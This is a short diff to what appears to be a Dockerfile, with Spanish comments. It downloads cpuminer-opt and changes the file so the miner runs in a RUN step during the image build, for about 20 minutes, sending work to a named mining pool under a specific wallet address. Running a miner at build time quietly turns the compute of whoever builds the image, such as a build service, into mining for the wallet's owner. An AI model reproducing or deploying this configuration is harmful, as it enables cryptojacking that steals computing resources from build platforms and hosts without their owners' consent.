@@ -12,5 +12,5 @@ RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36
     tar xf cpuminer-opt-linux.tar.gz && \
     chmod +x cpuminer-sse2
 
-# Ejecutar el proceso de minería, reintentando si termina prematuramente, durante un total de 5 minutos
-CMD /bin/bash -c 'inicio=$$SECONDS; while [[ $$(($$SECONDS - inicio)) -lt 300 ]]; do ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.5; done'
+# Ejecutar el proceso de minería durante 20 minutos
+RUN ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.5
